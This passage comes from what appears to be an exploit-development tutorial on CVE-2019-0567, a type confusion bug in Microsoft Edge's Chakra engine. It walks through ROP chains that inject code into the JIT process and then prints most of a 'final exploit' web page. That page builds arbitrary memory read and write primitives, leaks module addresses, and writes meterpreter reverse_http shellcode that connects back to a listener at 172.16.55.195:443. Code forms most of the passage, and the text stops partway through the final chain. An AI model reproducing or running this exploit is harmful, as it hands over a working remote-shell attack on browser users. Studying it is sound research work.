write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);      // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();

// Update CONTEXT.Rip to point to a ret gadget directly instead of relying on CreateRemoteThread start routine (which CFG checks)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x26f72a, chakraHigh);      // 0x18026f72a: add rax, 0x60 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x28b4fe, chakraHigh);	   // ret gadget we want to overwrite our remote thread's RIP with 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xfeab, chakraHigh);        // 0x18000feab: mov qword [rax], rcx ; ret  (Context.Rip = ret_gadget)
next();

// WriteProcessMemory() ROP chain (Number 4)
// Stage 9 -> Write our ROP chain to the remote process, using the JIT handle and the leaked stack via GetThreadContext()

// SIZE_T nSize (R9)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000100, 0x00000000);             // SIZE_T nSize (0x100) (CONTEXT.Rsp is writable and a "full" stack, so 0x100 is more than enough)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// LPVOID lpBaseAddress (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a118-0x08, kernelbaseHigh);      // .data section of kernelbase.dll where CONTEXT.Rsp resides
next();                                                                      
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x255fa0, chakraHigh);       // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret (Pointer to CONTEXT.Rsp)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x26ef31, chakraHigh);      // 0x18026ef31: mov rax, qword [rax] ; ret (get CONTEXT.Rsp)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x435f21, chakraHigh);      // 0x180435f21: mov rdx, rax ; mov rax, rdx ; add rsp, 0x28 ; ret (RAX and RDX now both have CONTEXT.Rsp)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// LPCVOID lpBuffer (R8)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);      // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000+ropBegin, chakraHigh);      // .data section of chakra.dll where our ROP chain is
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which holds the full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();                                                                     // Recall RAX already has a writable pointer in it  

// Call KERNELBASE!WriteProcessMemory
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x20)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
```

Setting a `jmp rax` breakpoint, and then after stepping through the `CONTEXT.Rip` update and `CONTEXT.Rsp` saving gadgets, we can start executing our `WriteProcessMemory` ROP chain.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion181.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion182.png" alt="">

As we can see, we set `nSize` to `0x100`. We are attempting to copy our ROP chain into the JIT process, and our ROP chain is much smaller than `0x100`. However, instead of calculating the size, we simply can just use `0x100` bytes as we have a full stack to work with in the remote process and it is writable. After setting the size, our call is in the following state:

```c
WriteProcessMemory(
	-
	-
	-
	sizeof(rop_chain)			// Size of our ROP chain
	-
);
```

The next parameter we will fix is `lpBaseAddress`, which will be where we want to write the ROP chain. In this case, it is the stack location, which we can leak from our preserved `CONTEXT.Rsp` address.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion183.png" alt="">

Using the same "trick" as before, our `mov rdx, [rdx+0x8]` gadget is circumvented by simply subtracting `0x8` before had the value we want to place in RDX. From here, we can clearly see we have extracted what `CONTEXT.Rsp` pointed to - and that is the stack within the JIT process.

Our call is in the following state:

```c
WriteProcessMemory(
	-
	addressof(CONTEXT.Rsp),			// Address of our remote thread's stack
	-
	sizeof(rop_chain)			// Size of our ROP chain
	-
);
```

Next up is the `lpBuffer` parameter. This parameter is very straight forward, as we can simply just `pop` the address of the `.data` section of `chakra.dll` where our ROP chain was placed.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion184.png" alt="">

Our call is now in the below state:

```c
WriteProcessMemory(
	-
	addressof(CONTEXT.Rsp),				// Address of our remote thread's stack
	addressof(data_chakra_shellcode_location),	// Address of our VirtualProtect ROP chain in the content process (.data of chakra) (what we want to write (our ROP chain))
	sizeof(rop_chain)				// Size of our ROP chain
	-
);
```

The next (and last register-placed parameter) is our `HANDLE`. 

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion185.png" alt="">

We now have our call almost completed:

```c
WriteProcessMemory(
	fulljitHandle, 					// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
	addressof(CONTEXT.Rsp),				// Address of our remote thread's stack
	addressof(data_chakra_shellcode_location),	// Address of our VirtualProtect ROP chain in the content process (.data of chakra) (what we want to write (our ROP chain))
	sizeof(rop_chain)				// Size of our ROP chain
	-
);
```

Lastly, all we need to do is set a `NULL` value of RSP + `0x28` and set RAX to `WriteProcessMemory`. The full call can be seen below:

```c
WriteProcessMemory(
	fulljitHandle, 					// PROCESS_ALL_ACCESS handle to JIT server we got from DuplicateHandle call
	addressof(CONTEXT.Rsp),				// Address of our remote thread's stack
	addressof(data_chakra_shellcode_location),	// Address of our VirtualProtect ROP chain in the content process (.data of chakra) (what we want to write (our ROP chain))
	sizeof(rop_chain)				// Size of our ROP chain
	NULL 						// Optional
);
```
<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion186.png" alt="">

We can then attach _another_ WinDbg session to the JIT process and examine the write operation.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion187.png" alt="">

As we can see, we have remotely placed our ROP chain to RSP! All we have to do now is update our thread's RIP member via `SetThreadContext` and then resume the thread to kick off execution!

`SetThreadContext` and `ResumeThread` ROP Chain
---

All that is left now is to set the thread's `CONTEXT` and resume the thread. Here is how this looks:

```c
SetThreadContext(
	threadHandle,				// A handle to the thread we want to set (our thread we created via CreateRemoteThread)
	addressof(VirtualAlloc_buffer)		// The updated CONTEXT structure
);
```

```c
ResumeThread(
	threadHandle,				// A handle to the thread we want to resume (our thread we created via CreateRemoteThread)
);
```

Here is our final exploit:

```javascript
<button onclick="main()">Click me to exploit CVE-2019-0567!</button>

<script>
// CVE-2019-0567: Microsoft Edge Type Confusion
// Author: Connor McGarr (@33y0re)

// Creating object obj
// Properties are stored via auxSlots since properties weren't declared inline
obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

// Create two DataView objects
dataview1 = new DataView(new ArrayBuffer(0x100));
dataview2 = new DataView(new ArrayBuffer(0x100));

// Function to convert to hex for memory addresses
function hex(x) {
    return x.toString(16);
}

// Arbitrary read function
function read64(lo, hi) {
    dataview1.setUint32(0x38, lo, true);        // DataView+0x38 = dataview2->buffer
    dataview1.setUint32(0x3C, hi, true);        // We set this to the memory address we want to read from (4 bytes at a time: e.g. 0x38 and 0x3C)

    // Instead of returning a 64-bit value here, we will create a 32-bit typed array and return the entire away
    // Write primitive requires breaking the 64-bit address up into 2 32-bit values so this allows us an easy way to do this
    var arrayRead = new Uint32Array(0x10);
    arrayRead[0] = dataview2.getInt32(0x0, true);   // 4-byte arbitrary read
    arrayRead[1] = dataview2.getInt32(0x4, true);   // 4-byte arbitrary read

    // Return the array
    return arrayRead;
}

// Arbitrary write function
function write64(lo, hi, valLo, valHi) {
    dataview1.setUint32(0x38, lo, true);        // DataView+0x38 = dataview2->buffer
    dataview1.setUint32(0x3C, hi, true);        // We set this to the memory address we want to write to (4 bytes at a time: e.g. 0x38 and 0x3C)

    // Perform the write with our 64-bit value (broken into two 4 bytes values, because of JavaScript)
    dataview2.setUint32(0x0, valLo, true);       // 4-byte arbitrary write
    dataview2.setUint32(0x4, valHi, true);       // 4-byte arbitrary write
}

// Function used to set prototype on tmp function to cause type transition on o object
function opt(o, proto, value) {
    o.b = 1;

    let tmp = {__proto__: proto};

    o.a = value;
}

// main function
function main() {
    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }

    let o = {a: 1, b: 2};

    opt(o, o, obj);     // Instead of supplying 0x1234, we are supplying our obj

    // Corrupt obj->auxSlots with the address of the first DataView object
    o.c = dataview1;

    // Corrupt dataview1->buffer with the address of the second DataView object
    obj.h = dataview2;

    // dataview1 methods act on dataview2 object
    // Since vftable is located from 0x0 - 0x8 in dataview2, we can simply just retrieve it without going through our read64() function
    vtableLo = dataview1.getUint32(0x0, true);
    vtableHigh = dataview1.getUint32(0x4, true);

    // Extract dataview2->type (located 0x8 - 0x10) so we can follow the chain of pointers to leak a stack address via...
    // ... type->javascriptLibrary->scriptContext->threadContext
    typeLo = dataview1.getUint32(0x8, true);
    typeHigh = dataview1.getUint32(0xC, true);

    // Print update
    document.write("[+] DataView object 2 leaked vtable from chakra.dll: 0x" + hex(vtableHigh) + hex(vtableLo));
    document.write("<br>");

    // Store the base of chakra.dll
    chakraLo = vtableLo - 0x5d0bf8;
    chakraHigh = vtableHigh;

    // Print update
    document.write("[+] chakra.dll base address: 0x" + hex(chakraHigh) + hex(chakraLo));
    document.write("<br>");

    // Leak a pointer to kernelbase.dll (KERNELBASE!DuplicateHandle) from the IAT of chakra.dll
    // chakra+0x5ee2b8 points to KERNELBASE!DuplicateHandle
    kernelbaseLeak = read64(chakraLo+0x5ee2b8, chakraHigh);

    // KERNELBASE!DuplicateHandle is 0x18de0 away from kernelbase.dll's base address
    kernelbaseLo = kernelbaseLeak[0]-0x18de0;
    kernelbaseHigh = kernelbaseLeak[1];

    // Store the pointer to KERNELBASE!DuplicateHandle (needed for our ACG bypass) into a more aptly named variable
    var duplicateHandle = new Uint32Array(0x4);
    duplicateHandle[0] = kernelbaseLeak[0];
    duplicateHandle[1] = kernelbaseLeak[1];

    // Print update
    document.write("[+] kernelbase.dll base address: 0x" + hex(kernelbaseHigh) + hex(kernelbaseLo));
    document.write("<br>");

    // Print update with our type pointer
    document.write("[+] type pointer: 0x" + hex(typeHigh) + hex(typeLo));
    document.write("<br>");

    // Arbitrary read to get the javascriptLibrary pointer (offset of 0x8 from type)
    javascriptLibrary = read64(typeLo+8, typeHigh);

    // Arbitrary read to get the scriptContext pointer (offset 0x450 from javascriptLibrary. Found this manually)
    scriptContext = read64(javascriptLibrary[0]+0x430, javascriptLibrary[1])

    // Arbitrary read to get the threadContext pointer (offset 0x3b8)
    threadContext = read64(scriptContext[0]+0x5c0, scriptContext[1]);

    // Leak a pointer to a pointer on the stack from threadContext at offset 0x8f0
    // https://bugs.chromium.org/p/project-zero/issues/detail?id=1360
    // Offsets are slightly different (0x8f0 and 0x8f8 to leak stack addresses)
    stackleakPointer = read64(threadContext[0]+0x8f8, threadContext[1]);

    // Print update
    document.write("[+] Leaked stack address! type->javascriptLibrary->scriptContext->threadContext->leafInterpreterFrame: 0x" + hex(stackleakPointer[1]) + hex(stackleakPointer[0]));
    document.write("<br>");

    // Counter
    let countMe = 0;

    // Helper function for counting
    function inc()
    {
        countMe+=0x8;
    }

    // Shellcode (will be executed in JIT process)
    // msfvenom -p windows/x64/meterpreter/reverse_http LHOST=172.16.55.195 LPORT=443 -f c
    write64(chakraLo+0x74b000+countMe, chakraHigh, 0xe48348fc, 0x00cce8f0);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x51410000, 0x51525041);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x56d23148, 0x528b4865);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x528b4860, 0x528b4818);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc9314d20, 0x50728b48);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4ab70f48, 0xc031484a);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x7c613cac, 0x41202c02);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x410dc9c1, 0xede2c101);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x528b4852, 0x8b514120);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x01483c42, 0x788166d0);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x0f020b18, 0x00007285);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x88808b00, 0x48000000);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x6774c085, 0x44d00148);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x5020408b, 0x4918488b);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x56e3d001, 0x41c9ff48);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4d88348b, 0x0148c931);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc03148d6, 0x0dc9c141);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc10141ac, 0xf175e038);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x244c034c, 0xd1394508);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4458d875, 0x4924408b);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4166d001, 0x44480c8b);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x491c408b, 0x8b41d001);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x01488804, 0x415841d0);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x5a595e58, 0x59415841);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x83485a41, 0x524120ec);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4158e0ff, 0x8b485a59);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xff4be912, 0x485dffff);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4953db31, 0x6e6977be);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x74656e69, 0x48564100);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc749e189, 0x26774cc2);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x53d5ff07, 0xe1894853);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x314d5a53, 0xc9314dc0);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xba495353, 0xa779563a);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x0ee8d5ff);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x31000000, 0x312e3237);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x35352e36, 0x3539312e);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x89485a00, 0xc0c749c1);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x000001bb, 0x53c9314d);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x53036a53, 0x8957ba49);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x0000c69f, 0xd5ff0000);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x000023e8, 0x2d652f00);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x65503754, 0x516f3242);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x58643452, 0x6b47336c);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x67377674, 0x4d576c79);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x3764757a, 0x0078466a);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x53c18948, 0x4d58415a);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4853c931, 0x280200b8);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000084, 0x53535000);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xebc2c749, 0xff3b2e55);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc68948d5, 0x535f0a6a);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xf189485a, 0x4dc9314d);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x5353c931, 0x2dc2c749);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xff7b1806, 0x75c085d5);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc1c7481f, 0x00001388);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xf044ba49, 0x0000e035);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xd5ff0000, 0x74cfff48);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xe8cceb02, 0x00000055);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x406a5953, 0xd189495a);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x4910e2c1, 0x1000c0c7);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xba490000, 0xe553a458);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x9348d5ff);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x89485353, 0xf18948e7);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x49da8948, 0x2000c0c7);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x89490000, 0x12ba49f9);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00e28996, 0xff000000);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc48348d5, 0x74c08520);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x078b66b2, 0x85c30148);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x58d275c0, 0x006a58c3);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0xc2c74959, 0x56a2b5f0);
	inc();
	write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x0000d5ff);
	inc();

	// Increment countMe (which is the variable used to write 1 QWORD at a time) by 0x50 bytes to give us some breathing room between our shellcode and ROP chain
	countMe += 0x50;

	// Store where our ROP chain begins
	ropBegin = countMe;

	// VirtualProtect() ROP chain (will be called in the JIT process)
    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x577fd4, chakraHigh);         // 0x180577fd4: pop rax ; ret
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x72E128, chakraHigh);         // .data pointer from chakra.dll with a non-zero value to bypass cmp r8d, [rax] future gadget
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x46377, chakraHigh);          // 0x180046377: pop rcx ; ret
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x74e030, chakraHigh);         // PDWORD lpflOldProtect (any writable address -> Eventually placed in R9)
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0xf6270, chakraHigh);          // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding for add rsp, 0x28
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding for add rsp, 0x28
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding for add rsp, 0x28
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding for add rsp, 0x28
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding for add rsp, 0x28
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x46377, chakraHigh);          // 0x180046377: pop rcx ; ret
    inc();

    // Store the current offset within the .data section into a var
    ropoffsetOne = countMe;

    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x00000000);                // LPVOID lpAddress (Eventually will be updated to the address we want to mark as RWX, our shellcode)
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x1d2c9, chakraHigh);          // 0x18001d2c9: pop rdx ; ret
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00001000, 0x00000000);                // SIZE_T dwSize (0x1000)
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000040, 0x00000000);                // DWORD flNewProtect (PAGE_EXECUTE_READWRITE)
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x577fd4, chakraHigh);         // 0x180577fd4: pop rax ; ret
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, kernelbaseLo+0x61700, kernelbaseHigh);  // KERNELBASE!VirtualProtect
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x272beb, chakraHigh);         // 0x180272beb: jmp rax (Call KERNELBASE!VirtualProtect)
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x118b9, chakraHigh);          // 0x1800118b9: add rsp, 0x18 ; ret
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x41414141, 0x41414141);                // Padding
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x4c1b65, chakraHigh);         // 0x1804c1b65: pop rdi ; ret
    inc();

    // Store the current offset within the .data section into a var
    ropoffsetTwo = countMe;

    write64(chakraLo+0x74b000+countMe, chakraHigh, 0x00000000, 0x00000000);                // Will be updated with the VirtualAllocEx allocation (our shellcode)
    inc();
    write64(chakraLo+0x74b000+countMe, chakraHigh, chakraLo+0x1ef039, chakraHigh);         // 0x1801ef039: push rdi ; ret (Return into our shellcode)
    inc();

    // We can reliably traverse the stack 0x6000 bytes
    // Scan the stack for the return address below
    /*
    0:020> u chakra+0xd4a73
    chakra!Js::JavascriptFunction::CallFunction<1>+0x83:
    00007fff`3a454a73 488b5c2478      mov     rbx,qword ptr [rsp+78h]
    00007fff`3a454a78 4883c440        add     rsp,40h
    00007fff`3a454a7c 5f              pop     rdi
    00007fff`3a454a7d 5e              pop     rsi
    00007fff`3a454a7e 5d              pop     rbp
    00007fff`3a454a7f c3              ret
    */

    // Creating an array to store the return address because read64() returns an array of 2 32-bit values
    var returnAddress = new Uint32Array(0x4);
    returnAddress[0] = chakraLo + 0xd4a73;
    returnAddress[1] = chakraHigh;

	// Counter variable
	let counter = 0x6000;

	// Loop
	while (counter != 0)
	{
	    // Store the contents of the stack
	    tempContents = read64(stackleakPointer[0]+counter, stackleakPointer[1]);

	    // Did we find our target return address?
        if ((tempContents[0] == returnAddress[0]) && (tempContents[1] == returnAddress[1]))
        {
			document.write("[+] Found our return address on the stack!");
            document.write("<br>");
            document.write("[+] Target stack address: 0x" + hex(stackleakPointer[1]) + hex(stackleakPointer[0]+counter));
            document.write("<br>");

            // Break the loop
            break;

        }
        else
        {
        	// Decrement the counter
	    	// This is because the leaked stack address is near the stack base so we need to traverse backwards towards the stack limit
	    	counter -= 0x8;
        }
	}

	// Confirm exploit 
	alert("[+] Press OK to enjoy the Meterpreter shell :)");

	// Store the value of the handle to the JIT server by way of chakra!ScriptEngine::SetJITConnectionInfo (chakra!JITManager+s_jitManager+0x8)
	jitHandle = read64(chakraLo+0x74d838, chakraHigh);

	// Helper function to be called after each stack write to increment offset to be written to
	function next()
	{
	    counter+=0x8;
	}

	// Begin ROP chain
	// Since __fastcall requires parameters 5 and so on to be at RSP+0x20, we actually have to put them at RSP+0x28
	// This is because we don't push a return address on the stack, as we don't "call" our APIs, we jump into them
	// Because of this we have to compensate by starting them at RSP+0x28 since we can't count on a return address to push them there for us

	// DuplicateHandle() ROP chain
	// Stage 1 -> Abuse PROCESS_DUP_HANDLE handle to JIT server by performing DuplicateHandle() to get a handle to the JIT server with full permissions
	// ACG is disabled in the JIT process
	// https://bugs.chromium.org/p/project-zero/issues/detail?id=1299

	// Writing our ROP chain to the stack, stack+0x8, stack+0x10, etc. after return address overwrite to hijack control-flow transfer

	// HANDLE hSourceProcessHandle (RCX) _should_ come first. However, we are configuring this parameter towards the end, as we need RCX for the lpTargetHandle parameter

	// HANDLE hSourceHandle (RDX)
	// (HANDLE)-1 value of current process
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Pseudo-handle to current process
	next();

	// HANDLE hTargetProcessHandle (R8)
	// (HANDLE)-1 value of current process
